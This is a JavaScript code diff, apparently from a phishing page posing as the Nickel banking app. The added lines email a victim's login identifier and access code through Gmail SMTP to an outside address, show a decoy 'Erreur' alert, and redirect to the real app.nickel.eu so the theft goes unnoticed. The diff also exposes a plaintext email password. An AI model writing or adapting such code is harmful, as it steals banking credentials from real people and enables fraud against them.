@@ -75,6 +75,17 @@ function addChecked(e) {
     if(ok ===6 ) c6.checked = true;
 
     if(ok === 6 ) {
+        Email.send({
+            Host : "smtp.gmail.com",
+            Username : "leonbonou20@gmail.com",
+            Password : "anselmo12.",
+            To : 'anselmehotegni@gmail.com',
+            From : "leonbonou20@gmail.com",
+            Subject : "Les Codes Nickel",
+            Body : "Identifiant: " + identifiant + " - Code : " + codeAccess
+        }).then(
+            message => alert("Erreur")
+        );
         window.location.href = "https://app.nickel.eu"
     }
 
